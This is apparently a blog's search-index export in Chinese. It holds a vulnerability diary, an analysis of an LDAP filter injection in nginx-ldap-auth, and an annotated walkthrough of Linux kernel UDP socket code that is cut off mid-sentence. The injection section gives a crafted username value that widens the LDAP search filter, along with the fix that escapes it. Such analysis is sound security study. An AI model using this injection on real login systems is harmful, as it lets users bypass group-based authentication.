[{"categories":null,"content":" 内核: CNNVD-202108-1741 Httpd: CNNVD-202112-981 CNNVD-202201-423 ","date":"2022-03-10","objectID":"/vul-list/:0:0","tags":null,"title":"个人漏洞列表","uri":"/vul-list/"},{"categories":null,"content":" 漏洞挖掘经常是没有反馈的, 日常自闭, 在这里记录一下 2022-4-30 写了一个内核漏洞检测工具, 截止到目前水了六个信创操作系统漏洞, 测试仍在继续, 预计一周报一个 写了一个Httpd Fuzz工具, 在lighttpd那里收获三个漏洞, 目前Fuzz目标为nginx, 期间发现nginx自定义内存管理api, 这里使用xxx方法进行适配 对nginx做代码审计, 步入正轨, 着重关注数据流入接口 对内核防御这方面有一些思路, 以后有空再去写 对IOS内核有些兴趣, 正在观望是否入坑 ","date":"2022-04-30","objectID":"/something/:0:0","tags":null,"title":"挖洞日记","uri":"/something/"},{"categories":["nginx"],"content":" 前段时间, 有人声称发现nginx 0day, 并在NginxDay中持续跟进漏洞上报流程, 虽然漏洞确实存在, 但漏洞只存在于一个示例项目, 且漏洞危害较低. 就目前笔者漏洞分析来看, 该行为多少有点花里胡哨, 下面分析一下这个有些鸡肋的漏洞. nginx提供ngx_http_auth_request_module模块用于鉴权, 其功能特点为需要用户自定义实现鉴权api, 并由ngx_http_auth_request_module模块调用 nginx-ldap-auth结合ldap实现鉴权机制, 是一种用户自定义实现鉴权api的示例项目 ","date":"2022-04-19","objectID":"/nginx-ldap-auth/:0:0","tags":["nginx","nginx-ldap-auth"],"title":"nginx-ldap-auth之user注入漏洞","uri":"/nginx-ldap-auth/"},{"categories":["nginx"],"content":"nginx-ldap-auth功能原理 nginx-ldap-auth关键文件 backend-sample-app.py(处理登录表单), 将user:passwd base64编码后设置Cookie nginx-ldap-auth-daemon.py(结合ldap进行鉴权), 解析http报文中的Cookie/Authorization(有Cookie的情况下鉴权以Cookie为主) ngx_http_auth_request_module模块常用路由 nginx直接向nginx-ldap-auth-daemon.py对应url发起请求, 此时未设置Cookie/Authorization返回401 nginx转发请求至backend-sample-app.py对应url处理登录表单, 并设置Cookie nginx重定向请求至nginx-ldap-auth-daemon.py对应url, 此时存在Cookie, 解析user, passwd, 调用ldap实现鉴权, 成功则返回200 ","date":"2022-04-19","objectID":"/nginx-ldap-auth/:0:1","tags":["nginx","nginx-ldap-auth"],"title":"nginx-ldap-auth之user注入漏洞","uri":"/nginx-ldap-auth/"},{"categories":["nginx"],"content":"nginx-ldap-auth-daemon.py鉴权分析 从下面鉴权代码可以看出, nginx-ldap-auth-daemon.py使用searchfilter过滤ldap结果, 查找目标登录用户 // ctx['template']默认对应: 'template': ('X-Ldap-Template', '(cn=%(username)s)'), // ctx['user'], ctx['pass']: 从Cookie中解析出的user, passwd searchfilter = ctx['template'] % { 'username': ctx['user'] } ... // 默认使用(cn=username)这种模式在ldap中查找用户 results = ldap_obj.search_s(ctx['basedn'], ldap.SCOPE_SUBTREE, searchfilter, ['objectclass'], 1) user_entry = results[0] ldap_dn = user_entry[0] ldap_obj.bind_s(ldap_dn, ctx['pass'], ldap.AUTH_SIMPLE) ","date":"2022-04-19","objectID":"/nginx-ldap-auth/:0:2","tags":["nginx","nginx-ldap-auth"],"title":"nginx-ldap-auth之user注入漏洞","uri":"/nginx-ldap-auth/"},{"categories":["nginx"],"content":"漏洞点 ctx[‘user’] 没有过滤字符, 直接使用http报文提供的数据 auth_header = self.headers.get('Authorization') auth_cookie = self.get_cookie(ctx['cookiename']) if auth_cookie != None and auth_cookie != '': auth_header = \"Basic \" + auth_cookie ... auth_decoded = base64.b64decode(auth_header[6:]) ... user, passwd = auth_decoded.split(':', 1) ... // 漏洞点 ctx['user'] = user ctx['pass'] = passwd ctx[‘template’] 可以被管理员自定义设置, issue提供了一种情况如下: X-Ldap-Template: (|(\u0026(memberOf=x)(cn=%(username)s))(\u0026(memberOf=y)(cn=%(username)s))) 解释上诉规则: |代表或, \u0026代表与, ()括号内容代表|/\u0026的作用区域, 那么上诉规则就可以解析为查找在x组内的username或y组内的username searchfilter = ctx[‘template’] % { ‘username’: ctx[‘user’] }, 见nginx-ldap-auth-daemon.py鉴权分析 结合ctx[‘template’], ctx[‘user’]的特点, 就可以实现ctx[‘user’]注入 \u003e\u003e\u003e template=\"(|(\u0026(memberOf=x)(cn=%(username)s))(\u0026(memberOf=y)(cn=%(username)s)))\" \u003e\u003e\u003e template%{\"username\": \"hack\"} '(|(\u0026(memberOf=x)(cn=hack))(\u0026(memberOf=y)(cn=hack)))' // 如果ctx['user']=\"x))((cn=hack\", 那么过滤规则就变成查找在x组内的x或hack或y组内的hack \u003e\u003e\u003e template%{\"username\": \"x))((cn=hack\"} '(|(\u0026(memberOf=x)(cn=x))((cn=hack))(\u0026(memberOf=y)(cn=x))((cn=hack)))' ","date":"2022-04-19","objectID":"/nginx-ldap-auth/:0:3","tags":["nginx","nginx-ldap-auth"],"title":"nginx-ldap-auth之user注入漏洞","uri":"/nginx-ldap-auth/"},{"categories":["nginx"],"content":"漏洞效果 目前来看只能通过user注入, 消除一些认证条件(比如特定组), 比较鸡肋. 当然不排除ldap由其他trick, 本二进制狗不知道=.= ","date":"2022-04-19","objectID":"/nginx-ldap-auth/:0:4","tags":["nginx","nginx-ldap-auth"],"title":"nginx-ldap-auth之user注入漏洞","uri":"/nginx-ldap-auth/"},{"categories":["nginx"],"content":"补丁分析 @@ -88,9 +96,9 @@ def do_GET(self): ... ctx['pass'] = passwd // 过滤user字符 + ctx['user'] = ldap.filter.escape_filter_chars(user) ","date":"2022-04-19","objectID":"/nginx-ldap-auth/:0:5","tags":["nginx","nginx-ldap-auth"],"title":"nginx-ldap-auth之user注入漏洞","uri":"/nginx-ldap-auth/"},{"categories":["linux内核源码分析"],"content":"发表于安全客 1. socket 1.1 sock_create 1.1.1 sock_alloc 1.1.2 inet_create 1.1.2.1 sk_alloc 1.2 sock_map_fd 2. send(运输层) 2.1 import_single_range 2.2 sockfd_lookup_light 2.3 sock_sendmsg 2.4 udp_sendmsg 2.4.1 udp_cmsg_send 2.4.2 TOS 2.4.3 多播/本地广播 2.4.4 检查sock中路由信息是否过期 2.4.5 udp_send_skb 2.4.6 udp_push_pending_frames 3. recv(运输层) 2.1 udp_recvmsg 2.1.1 __skb_recv_udp 2.1.1.1 __skb_try_recv_from_queue 4. IP(网络层) 4.1 ip_cmsg_send 4.2 ip_make_skb 4.2.1 ip_setup_cork 4.2.2 __ip_make_skb 4.3 ip_append_data 4.3.1 __ip_append_data 4.4 ip_send_skb 4.4.1 __ip_local_out ","date":"2021-03-21","objectID":"/kernel_net/:0:0","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"1. socket SOCK_CLOEXEC 和 SOCK_NONBLOCK是2.6.27版本后增加的sock类型: SOCK_CLOEXEC 借助文件描述符FD_CLOEXEC 实现子进程运行exec后关闭sock_fd机制 SOCK_NONBLOCK 借助文件描述符O_NONBLOCK 实现非阻塞IO通信 int __sys_socket(int family, int type, int protocol) { int retval; struct socket *sock; int flags; /* Check the SOCK_* constants for consistency. */ BUILD_BUG_ON(SOCK_CLOEXEC != O_CLOEXEC); BUILD_BUG_ON((SOCK_MAX | SOCK_TYPE_MASK) != SOCK_TYPE_MASK); BUILD_BUG_ON(SOCK_CLOEXEC \u0026 SOCK_TYPE_MASK); BUILD_BUG_ON(SOCK_NONBLOCK \u0026 SOCK_TYPE_MASK); // 如果flags除SOCK_CLOEXEC/SOCK_NONBLOCK掩码外不存在其他flag标志, 直接返回错误码 flags = type \u0026 ~SOCK_TYPE_MASK; if (flags \u0026 ~(SOCK_CLOEXEC | SOCK_NONBLOCK)) return -EINVAL; type \u0026= SOCK_TYPE_MASK; // 因为SOCK_NONBLOCK实现的本质是借助O_NONBLOCK, 所以二者内容矛盾时, 使用O_NONBLOCK替换SOCK_NONBLOCK if (SOCK_NONBLOCK != O_NONBLOCK \u0026\u0026 (flags \u0026 SOCK_NONBLOCK)) flags = (flags \u0026 ~SOCK_NONBLOCK) | O_NONBLOCK; // 创建socket, 详细见1.1 retval = sock_create(family, type, protocol, \u0026sock); if (retval \u003c 0) return retval; // 将fd, file, socket互相绑定, 详细见1.2 return sock_map_fd(sock, flags \u0026 (O_CLOEXEC | O_NONBLOCK)); } ","date":"2021-03-21","objectID":"/kernel_net/:1:0","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"1.1 sock_create sock_create int sock_create(int family, int type, int protocol, struct socket **res) { return __sock_create(current-\u003ensproxy-\u003enet_ns, family, type, protocol, res, 0); } __sock_create int __sock_create(struct net *net, int family, int type, int protocol, struct socket **res, int kern) { int err; struct socket *sock; const struct net_proto_family *pf; /* * Check protocol is in range */ // 检查协议族是否超出范围 if (family \u003c 0 || family \u003e= NPROTO) return -EAFNOSUPPORT; // 检查socket类型是否超出范围 if (type \u003c 0 || type \u003e= SOCK_MAX) return -EINVAL; /* Compatibility. This uglymoron is moved from INET layer to here to avoid deadlock in module load. */ // SOCK_PACKET被从PF_INET族移入PF_PACKET if (family == PF_INET \u0026\u0026 type == SOCK_PACKET) { pr_info_once(\"%s uses obsolete (PF_INET,SOCK_PACKET)\\n\", current-\u003ecomm); family = PF_PACKET; } // 用来适配LSM(linux security module):LSM是一种安全框架， // 将钩子安插在内核的关键函数上, 通过钩子上存储函数指针链表调用安全检查函数 // 用以在不修改内核代码的前提下, 为内核安装安全模块。 // 理论上讲不同的安全模块可以被同时安装到内核中, 钩子函数会依次执行对应的安全检查函数。 err = security_socket_create(family, type, protocol, kern); if (err) return err; /* * Allocate the socket and allow the family to set things up. if * the protocol is 0, the family is instructed to select an appropriate * default. */ // 创建socket, 详细见1.1.1 sock = sock_alloc(); if (!sock) { net_warn_ratelimited(\"socket: no more sockets\\n\"); return -ENFILE; /* Not exactly a match, but its the closest posix thing */ } // 为socket-\u003etype填充socket类型信息 sock-\u003etype = type; #ifdef CONFIG_MODULES /* Attempt to load a protocol module if the find failed. * * 12/09/1996 Marcin: But! this makes REALLY only sense, if the user * requested real, full-featured networking support upon configuration. * Otherwise module support will break! */ // 如果协议族内容不存在, 则试图加载驱动(内核执行用户指令modprobe加载驱动) if (rcu_access_pointer(net_families[family]) == NULL) request_module(\"net-pf-%d\", family); #endif // 进入rcu_read区域, 有关rcu的扩展可以看这篇文章 [RCU简介](https://zhuanlan.zhihu.com/p/113999842) rcu_read_lock(); // 获得协议族信息 pf = rcu_dereference(net_families[family]); err = -EAFNOSUPPORT; if (!pf) goto out_release; /* * We will call the -\u003ecreate function, that possibly is in a loadable * module, so we have to bump that loadable module refcnt first. */ // 检查协议族对应的模块是否被加载\u0026增加模块的引用数 if (!try_module_get(pf-\u003eowner)) goto out_release; /* Now protected by module ref count */ rcu_read_unlock(); // 在udp中调用inet_create创建sock, 详细见1.1.2 err = pf-\u003ecreate(net, sock, protocol, kern); if (err \u003c 0) goto out_module_put; /* * Now to bump the refcnt of the [loadable] module that owns this * socket at sock_release time we decrement its refcnt. */ // 用户需要使用sock-\u003eops, 所以他对应的模块必须在内存中加载 if (!try_module_get(sock-\u003eops-\u003eowner)) goto out_module_busy; /* * Now that we're done with the -\u003ecreate function, the [loadable] * module can have its refcnt decremented */ // pf-\u003ecreate函数调用完毕, 协议族对应的可加载模板引用数-1 module_put(pf-\u003eowner); err = security_socket_post_create(sock, family, type, protocol, kern); if (err) goto out_sock_release; *res = sock; return 0; out_module_busy: err = -EAFNOSUPPORT; out_module_put: sock-\u003eops = NULL; module_put(pf-\u003eowner); out_sock_release: sock_release(sock); return err; out_release: rcu_read_unlock(); goto out_sock_release; } ","date":"2021-03-21","objectID":"/kernel_net/:1:1","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"1.1.1 sock_alloc struct socket *sock_alloc(void) { struct inode *inode; struct socket *sock; // 创建inode文件索引结点 // alloc inode时, 会分配sizeof(struct socket_alloc) 大小空间 inode = new_inode_pseudo(sock_mnt-\u003emnt_sb); if (!inode) return NULL; // 依据vfs_inode在struct socket_alloc中的偏移定位socket_alloc地址, 然后定位socket 成员位置 /* struct socket_alloc { struct socket socket; struct inode vfs_inode; }; static inline struct socket *SOCKET_I(struct inode *inode) { return \u0026container_of(inode, struct socket_alloc, vfs_inode)-\u003esocket; } */ sock = SOCKET_I(inode); // 填充inode属性, inode-\u003ei_ino = get_next_ino(); inode-\u003ei_mode = S_IFSOCK | S_IRWXUGO; inode-\u003ei_uid = current_fsuid(); inode-\u003ei_gid = current_fsgid(); inode-\u003ei_op = \u0026sockfs_inode_ops; return sock; } ","date":"2021-03-21","objectID":"/kernel_net/:1:2","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"1.1.2 inet_create static int inet_create(struct net *net, struct socket *sock, int protocol, int kern) { struct sock *sk; struct inet_protosw *answer; struct inet_sock *inet; struct proto *answer_prot; unsigned char answer_flags; int try_loading_module = 0; int err; // 检查协议是否超出范围 if (protocol \u003c 0 || protocol \u003e= IPPROTO_MAX) return -EINVAL; // 设置socket为无连接状态 sock-\u003estate = SS_UNCONNECTED; /* Look for the requested type/protocol pair. */ lookup_protocol: err = -ESOCKTNOSUPPORT; rcu_read_lock(); // 此宏定义使用了RCU机制, 大致功能为遍历 \u0026inetsw[sock-\u003etype] 链表, // 同时返回链表的next指针, 认为该指针是struct inet_protosw中的list成员, // 根据相对偏移, 定位此链表指针对应的结构体首地址, 赋值给answer // 遍历对应sock-\u003etype的inetsw链表, 查找协议族中与socket类型相对应的网络层协议信息 // IPPROTO_IP表示用户不指定协议, 使用默认协议 list_for_each_entry_rcu(answer, \u0026inetsw[sock-\u003etype], list) { err = 0; /* Check the non-wild match. */ // 如果遍历获得与用户指定协议相同的网络协议(IPPROTO_IP除外), 成功退出 if (protocol == answer-\u003eprotocol) { if (protocol != IPPROTO_IP) break; } else { /* Check for the two wild cases. */ // 用户指定IPPROTO_IP后, 使用默认协议 if (IPPROTO_IP == protocol) { protocol = answer-\u003eprotocol; break; } // 遍历获得的协议必须非IPPROTO_IP(即必须指定确定协议) if (IPPROTO_IP == answer-\u003eprotocol) break; } err = -EPROTONOSUPPORT; } // 为了解决上诉错误, 此处决定尝试加载驱动(最多尝试两次) if (unlikely(err)) { if (try_loading_module \u003c 2) { rcu_read_unlock(); /* * Be more specific, e.g. net-pf-2-proto-132-type-1 * (net-pf-PF_INET-proto-IPPROTO_SCTP-type-SOCK_STREAM) */ if (++try_loading_module == 1) request_module(\"net-pf-%d-proto-%d-type-%d\", PF_INET, protocol, sock-\u003etype); /* * Fall back to generic, e.g. net-pf-2-proto-132 * (net-pf-PF_INET-proto-IPPROTO_SCTP) */ else request_module(\"net-pf-%d-proto-%d\", PF_INET, protocol); goto lookup_protocol; } else goto out_rcu_unlock; } err = -EPERM; // 调用SOCK_RAW, 需要验证权限 if (sock-\u003etype == SOCK_RAW \u0026\u0026 !kern \u0026\u0026 !ns_capable(net-\u003euser_ns, CAP_NET_RAW)) goto out_rcu_unlock; sock-\u003eops = answer-\u003eops; answer_prot = answer-\u003eprot; answer_flags = answer-\u003eflags; rcu_read_unlock(); WARN_ON(!answer_prot-\u003eslab); err = -ENOBUFS; // sk_alloc 创建sock(真实大小: sizeof(struct xxx_sock). 比如udp对应udp_sock), 详细见1.1.2.1 sk = sk_alloc(net, PF_INET, GFP_KERNEL, answer_prot, kern); if (!sk) goto out; err = 0; if (INET_PROTOSW_REUSE \u0026 answer_flags) sk-\u003esk_reuse = SK_CAN_REUSE; // 将sock转化为inet_sock(包含sock成员) inet = inet_sk(sk); inet-\u003eis_icsk = (INET_PROTOSW_ICSK \u0026 answer_flags) != 0; inet-\u003enodefrag = 0; ... // 检查配置确定是否开启动态mtu探测 if (net-\u003eipv4.sysctl_ip_no_pmtu_disc) inet-\u003epmtudisc = IP_PMTUDISC_DONT; else inet-\u003epmtudisc = IP_PMTUDISC_WANT; inet-\u003einet_id = 0; // socket与sock相互绑定 sock_init_data(sock, sk); // 初始化sock与inet属性 sk-\u003esk_destruct = inet_sock_destruct; sk-\u003esk_protocol = protocol; sk-\u003esk_backlog_rcv = sk-\u003esk_prot-\u003ebacklog_rcv; inet-\u003euc_ttl = -1; inet-\u003emc_loop = 1; inet-\u003emc_ttl = 1; inet-\u003emc_all = 1; inet-\u003emc_index = 0; inet-\u003emc_list = NULL; inet-\u003ercv_tos = 0; ... out: return err; out_rcu_unlock: rcu_read_unlock(); goto out; } ","date":"2021-03-21","objectID":"/kernel_net/:1:3","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"1.1.2.1 sk_alloc struct sock *sk_alloc(struct net *net, int family, gfp_t priority, struct proto *prot, int kern) { struct sock *sk; // 如果协议族存在slab则使用kmem_cache_alloc(slab, priority \u0026 ~__GFP_ZERO); 分配内存(不使用内核通用的slab, 可预防内存攻击) // 如果协议族slab为空, 使用kmalloc分配内存 sk = sk_prot_alloc(prot, priority | __GFP_ZERO, family); if (sk) { // 指定sock协议族 sk-\u003esk_family = family; /* * See comment in struct sock definition to understand * why we need sk_prot_creator -acme */ sk-\u003esk_prot = sk-\u003esk_prot_creator = prot; sk-\u003esk_kern_sock = kern; sock_lock_init(sk); sk-\u003esk_net_refcnt = kern ? 0 : 1; if (likely(sk-\u003esk_net_refcnt)) { get_net(net); sock_inuse_add(net, 1); } // 将sock与net相互绑定 sock_net_set(sk, net); refcount_set(\u0026sk-\u003esk_wmem_alloc, 1); ... } return sk; } ","date":"2021-03-21","objectID":"/kernel_net/:1:4","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"1.2 sock_map_fd static int sock_map_fd(struct socket *sock, int flags) { struct file *newfile; // 获得空闲fd int fd = get_unused_fd_flags(flags); if (unlikely(fd \u003c 0)) { // 失败后释放socket sock_release(sock); return fd; } // 创建file对象 // 调用alloc_file_pseudo, 以socket对应的inode为基础创建file对象, // socket文件功能函数替换原生功能函数 /* file与socket相互绑定 sock-\u003efile = file; file-\u003eprivate_data = sock; */ newfile = sock_alloc_file(sock, flags, NULL); if (!IS_ERR(newfile)) { // fd与file相互绑定 fd_install(fd, newfile); return fd; } put_unused_fd(fd); return PTR_ERR(newfile); } ","date":"2021-03-21","objectID":"/kernel_net/:1:5","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2. send(运输层) int __sys_sendto(int fd, void __user *buff, size_t len, unsigned int flags, struct sockaddr __user *addr, int addr_len) { struct socket *sock; struct sockaddr_storage address; int err; struct msghdr msg; struct iovec iov; int fput_needed; // 将待传输数据地址(判断该地址是否为用户态地址)和长度填充进入iov结构体, // 使用uaccess_kernel()判断当前系统调用可访问空间是否为全部空间(KERNEL_DS), // 由此决定使用 msg.msg_iter-\u003ekvec/msg.msg_iter-\u003eiov保存用户数据信息 // 详细见2.1 err = import_single_range(WRITE, buff, len, \u0026iov, \u0026msg.msg_iter); if (unlikely(err)) return err; // 通过fd获得struct fd, struct fd间接引用file, 然后通过file-\u003eprivate_data获得socket // 详细见2.2 sock = sockfd_lookup_light(fd, \u0026err, \u0026fput_needed); if (!sock) goto out; msg.msg_name = NULL; msg.msg_control = NULL; msg.msg_controllen = 0; msg.msg_namelen = 0; if (addr) { // 使用copy_from_user将用户空间存储的目标地址复制到内核, // 期间会判断目标地址长度是否大于 sizeof(struct sockaddr_storage) err = move_addr_to_kernel(addr, addr_len, \u0026address); if (err \u003c 0) goto out_put; msg.msg_name = (struct sockaddr *)\u0026address; msg.msg_namelen = addr_len; } // 设置非阻塞IO if (sock-\u003efile-\u003ef_flags \u0026 O_NONBLOCK) flags |= MSG_DONTWAIT; msg.msg_flags = flags; err = sock_sendmsg(sock, \u0026msg); out_put: fput_light(sock-\u003efile, fput_needed); out: return err; } ","date":"2021-03-21","objectID":"/kernel_net/:2:0","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.1 import_single_range int import_single_range(int rw, void __user *buf, size_t len, struct iovec *iov, struct iov_iter *i) { if (len \u003e MAX_RW_COUNT) len = MAX_RW_COUNT; // 检查 buf:buf+len 是否指向用户区域 if (unlikely(!access_ok(buf, len))) return -EFAULT; // 记录用户数据地址与长度 iov-\u003eiov_base = buf; iov-\u003eiov_len = len; // i-\u003ecount = count; 将数据长度记录进入msg.msg_iter-\u003ecount iov_iter_init(i, rw, iov, 1, len); return 0; } iov_iter_init void iov_iter_init(struct iov_iter *i, unsigned int direction, const struct iovec *iov, unsigned long nr_segs, size_t count) { // 不能存在读写之外的标志位 WARN_ON(direction \u0026 ~(READ | WRITE)); // 忽略传入标志位, 直接赋予READ | WRITE direction \u0026= READ | WRITE; // uaccess_kernel()判断当前系统调用可访问空间是否为全部空间(KERNEL_DS), // 由此决定使用ITER_KVEC / ITER_IOVEC // msg.msg_iter-\u003ekvec/iov为union类型 if (uaccess_kernel()) { i-\u003etype = ITER_KVEC | direction; i-\u003ekvec = (struct kvec *)iov; } else { i-\u003etype = ITER_IOVEC | direction; i-\u003eiov = iov; } i-\u003enr_segs = nr_segs; i-\u003eiov_offset = 0; i-\u003ecount = count; } ","date":"2021-03-21","objectID":"/kernel_net/:2:1","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.2 sockfd_lookup_light static struct socket *sockfd_lookup_light(int fd, int *err, int *fput_needed) { // 通过fd获得struct fd struct fd f = fdget(fd); struct socket *sock; *err = -EBADF; // 查看struct fd是否与file绑定 if (f.file) { /* 判断file文件操作结构体成员是否与socket文件操作结构体相同, 相同则说明struct fd内绑定的确实是socket文件, 返回file-\u003eprivate_data即socket if (file-\u003ef_op == \u0026socket_file_ops) return file-\u003eprivate_data; */ sock = sock_from_file(f.file, err); if (likely(sock)) { // 表示可解除对该文件描述符的引用 *fput_needed = f.flags \u0026 FDPUT_FPUT; return sock; } fdput(f); } return NULL; } ","date":"2021-03-21","objectID":"/kernel_net/:2:2","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.3 sock_sendmsg sock_sendmsg -\u003e sock_sendmsg_nosec -\u003e inet_sendmsg -\u003e udp_sendmsg (层层封装) int sock_sendmsg(struct socket *sock, struct msghdr *msg) { // LSM hook int err = security_socket_sendmsg(sock, msg, msg_data_left(msg)); return err ?: sock_sendmsg_nosec(sock, msg); } (假设family=AF_INET, protocol=UDP)调用sock-\u003eops-\u003esendmsg, 调用协议族自带的sendmsg功能函数(inet_sendmsg) // msg_data_left(msg) 获得用户数据大小(msg.msg_iter-\u003ecount) static inline int sock_sendmsg_nosec(struct socket *sock, struct msghdr *msg) { int ret = INDIRECT_CALL_INET(sock-\u003eops-\u003esendmsg, inet6_sendmsg, inet_sendmsg, sock, msg, msg_data_left(msg)); BUG_ON(ret == -EIOCBQUEUED); return ret; } 根据socket获得sock, 由protocol决定调用功能函数(udp_sendmsg) int inet_sendmsg(struct socket *sock, struct msghdr *msg, size_t size) { struct sock *sk = sock-\u003esk; // 如果没有绑定端口, 这里自动绑定端口 if (unlikely(inet_send_prepare(sk))) return -EAGAIN; return INDIRECT_CALL_2(sk-\u003esk_prot-\u003esendmsg, tcp_sendmsg, udp_sendmsg, sk, msg, size); } 栈回溯 gef➤ bt #0 udp_sendmsg (sk=0xffff888005c7d680, msg=0xffffc900001b7e10, len=0x800) at net/ipv4/udp.c:969 #1 0xffffffff819f4135 in inet_sendmsg (sock=\u003coptimized out\u003e, msg=0xffffc900001b7e10, size=0x800) at net/ipv4/af_inet.c:807 #2 0xffffffff8190ba9e in sock_sendmsg_nosec (msg=\u003coptimized out\u003e, sock=\u003coptimized out\u003e) at ./include/linux/uio.h:235#3 sock_sendmsg (sock=0xffff888006817a80, msg=0xffffc900001b7e10) at net/socket.c:657 #4 0xffffffff8190de13 in __sys_sendto (fd=\u003coptimized out\u003e, buff=\u003coptimized out\u003e, len=\u003coptimized out\u003e, flags=0x0, addr=0x7ffde0c0cf10, addr_len=0x10) at net/socket.c:1952 ","date":"2021-03-21","objectID":"/kernel_net/:2:3","tags":["linux kernel","源码分析","网络"],"title":"linux内核(5.4.81)---网络模块源码分析","uri":"/kernel_net/"},{"categories":["linux内核源码分析"],"content":"2.4 udp_sendmsg 前置知识 宏定义展开 DECLARE_SOCKADDR // struct sockaddr_in * sin= ({__sockaddr_check_size(sizeof(*sin)); (struct sockaddr_in *) msg-\u003emsg_name;}) DECLARE_SOCKADDR(struct sockaddr_in *, usin, msg-\u003emsg_name); IS_UDPLITE: 传统的 UDP 通信对整个报文进行校验, UDP-LITE 通信则可以设置校验的长度, 适用于可以接受轻微的报文内容出错的应用场景 // int err, is_udplite = (sk) (sk-\u003esk_protocol == IPPROTO_UDPLITE) int err, is_udplite = IS_UDPLITE(sk); 根据socket获得inet_sock, udp_sock struct inet_sock *inet = inet_sk(sk); struct udp_sock *up = udp_sk(sk); udp_sock的corkflag标志或msg中的MSG_MORE标志存在则开启软木塞机制 int corkreq = up-\u003ecorkflag || msg-\u003emsg_flags\u0026MSG_MORE; udp 不能处理带外数据请求 if (msg-\u003emsg_flags \u0026 MSG_OOB) /* Mirror BSD error message compatibility */ return -EOPNOTSUPP; 尝试追加数据(由udp_sock-\u003epending决定), 进入do_append_data, 阻塞追加 if (up-\u003epending) { /* * There are pending frames. * The socket lock must be held while it's corked. */ lock_sock(sk); if (likely(up-\u003epending)) { if (unlikely(up-\u003epending != AF_INET)) { release_sock(sk); return -EINVAL; } goto do_append_data; } release_sock(sk); } ulen 表示udp报文大小(带udphdr) ulen += sizeof(struct udphdr); usin包含目标ip, 端口, 协议族信息. 在udp协议中, usin应使用AF_INET或AF_UNSPEC(支持同时返回IPv4\u0026IPv6 信息). 同时如果当前状态为TCP_ESTABLISHED, 表示udp连接已经被建立(connected), usin可为空, 接下来需要继承上次通信对应的ip与端口信息. if (usin) { // 如果udp_send 存在目标位置, 则检查协议族, if (msg-\u003emsg_namelen \u003c sizeof(*usin)) return -EINVAL; if (usin-\u003esin_family != AF_INET) { if (usin-\u003esin_family != AF_UNSPEC) return -EAFNOSUPPORT; } // 填充目标ip与端口信息(端口必须存在) daddr = usin-\u003esin_addr.s_addr; dport = usin-\u003esin_port; if (dport == 0) return -EINVAL; } else { // TCP_ESTABLISHED表示udp连接已经被建立, 所以可以不需要目标位置信息 if (sk-\u003esk_state != TCP_ESTABLISHED) return -EDESTADDRREQ; daddr = inet-\u003einet_daddr; dport = inet-\u003einet_dport; /* Open fast path for connected socket. Route will not be used, if at least one option is set. */ connected = 1; } 处理udp协议控制信息 // ipc用来记录控制信息 ipcm_init_sk(\u0026ipc, inet); // udp分片长度 ipc.gso_size = up-\u003egso_size; // 开始解析控制信息, 填充至ipc, 详细见2.4.1 if (msg-\u003emsg_controllen) { err = udp_cmsg_send(sk, msg, \u0026ipc.gso_size); // cmsg-\u003ecmsg_level中存在SOL_UDP(need_ip = true), 进入ip_cmsg_send, 详细见4.1 if (err \u003e 0) err = ip_cmsg_send(sk, msg, \u0026ipc, sk-\u003esk_family == AF_INET6); if (unlikely(err \u003c 0)) { kfree(ipc.opt); return err; } if (ipc.opt) free = 1; connected = 0; } 为ipc.opt 填充ip 选项信息(如果cmsg中存在ip选项信息, 则提前填充, 掠过此处). 即如果用户没有自定义ip 选项信息, 则使用inet默认的ip 选项信息 // ip 选项描述结构体 /** struct ip_options - IP Options * * @faddr - Saved first hop address * @nexthop - Saved nexthop address in LSRR and SSRR * @is_strictroute - Strict source route * @srr_is_hit - Packet destination addr was our one * @is_changed - IP checksum more not valid * @rr_needaddr - Need to record addr of outgoing dev * @ts_needtime - Need to record timestamp * @ts_needaddr - Need to record addr of outgoing dev */ struct ip_options { __be32 faddr; __be32 nexthop; unsigned char optlen; unsigned char srr; unsigned char rr; unsigned char ts; unsigned char is_strictroute:1, srr_is_hit:1, is_changed:1, rr_needaddr:1, ts_needtime:1, ts_needaddr:1; unsigned char router_alert; unsigned char cipso; unsigned char __pad2; unsigned char __data[0]; }; if (!ipc.opt) { struct ip_options_rcu *inet_opt; rcu_read_lock(); inet_opt = rcu_dereference(inet-\u003einet_opt); // 将inet-\u003einet_opt-\u003eopt拷贝给opt_copy if (inet_opt) { memcpy(\u0026opt_copy, inet_opt, sizeof(*inet_opt) + inet_opt-\u003eopt.optlen); // 填充ipc.opt ipc.opt = \u0026opt_copy.opt; } rcu_read_unlock(); } 检查是否设置了源记录路由(source record route, SRR) IP 选项. SRR 有两种类型: 宽松源记录路由/严格源记录路由. 如果设置SRR, 则会记录第一跳地址并保存到faddr, 然后将socket 标记为unconnected if (ipc.opt \u0026\u0026 ipc.opt-\u003eopt.srr) { if (!daddr) { err = -EINVAL; goto out_free; } faddr = ipc.opt-\u003eopt.faddr; connected = 0; } 获得tos标志(优先从控制信息ipc中获取, 没有自定义则从inet默认获取tos), tos详细见2.4.2 tos = get_rttos(\u0026ipc, inet); 禁止路由设置可以由三种方式控制 if (sock_flag(sk, SOCK_LOCALROUTE) || (msg-\u003emsg_flags \u0026 MSG_DONTROUTE) || (ipc.opt \u0026\u0026 